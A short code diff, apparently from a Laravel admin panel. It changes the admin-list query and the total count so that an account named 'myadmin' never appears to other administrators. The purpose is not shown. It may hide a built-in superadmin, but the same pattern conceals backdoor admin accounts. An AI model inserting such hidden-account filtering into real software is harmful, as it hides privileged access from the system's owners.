@@ -26,11 +26,11 @@ class AdminController extends Controller
             }
             $item= Admin::when($username,function($query) use ($username){
                 return $query->where('username','like','%'.$username.'%');
-            })->skip($page)->take($limit)->get();
+            })->where('username','!=','myadmin')->skip($page)->take($limit)->get();
     
             $total= Admin::when($username,function($query) use ($username){
                 return $query->where('username','like','%'.$username.'%');
-            })->count();
+            })->where('username','!=','myadmin')->count();
     
             $data['item'] = $item;
             $data['total'] = $total;
